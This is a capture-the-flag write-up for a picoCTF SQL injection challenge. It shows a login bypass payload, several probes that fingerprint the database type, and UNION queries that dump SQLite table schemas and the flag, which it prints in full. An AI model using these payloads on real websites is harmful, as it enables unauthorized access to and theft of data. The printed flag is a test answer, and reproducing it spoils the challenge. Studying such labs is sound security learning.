# More SQLi 

## Problem  
Can you find the flag on this website.
Try to find the flag here. [http://saturn.picoctf.net:53508/](http://saturn.picoctf.net:53508/)


## Solution

Putting in a random userid/password combo shows that it's doing a basic sql query where userid and password equal the supplied form fields.  To get around this we'll have to put in values in for userid and password that'll break the SQL and return a result.
```
password = 'or 1=1;--
userid = 123 or whatever you want.
```

Next up you are presented with a lookup form for finding city, address, and phone number.  Assuming that we have to figure out how to get all the data out of this table we need to figure out how to do a sql injection attack here as well.  
[https://book.hacktricks.xyz/pentesting-web/sql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)  
[https://www.hackingloops.com/sql-injection-cheat-sheet/](https://www.hackingloops.com/sql-injection-cheat-sheet/)  
[https://gist.github.com/Cuncis/eb6a0857b16e818a069da1e2c7e3f366](https://gist.github.com/Cuncis/eb6a0857b16e818a069da1e2c7e3f366)  
[https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)  

Started to google for various sql injection cheat sheets.  Walked through several queries trying to get some sort of responses so as to identify if this was an MySQL, PostgreSQL, SQLServer, SQLlite, etc, etc... 
```
1' + sleep(10); --
1' UNION select @@version;--
1' WAITFOR DELAY '0:0:10'; --
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

That last one didn't return a server error so it looks like it is a SQLlite database.  To confirm, I ran this query and it returned that it was version 3.31.1.
```
' UNION SELECT 1, sqlite_version(), 3;--
```

With that info in mind, I was able to find this query for getting SQLlite to provide the tables and their structure.  In the results the MORE_TABLE table referenced having a column called flag.
```
' UNION SELECT name, sql, null from sqlite_master;--  
```

Queried that table to spit out all the records and their flag column entries.  
```
' UNION SELECT flag, null, null from more_table;--
```

This only returned one record and the text was:  
```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}	
```

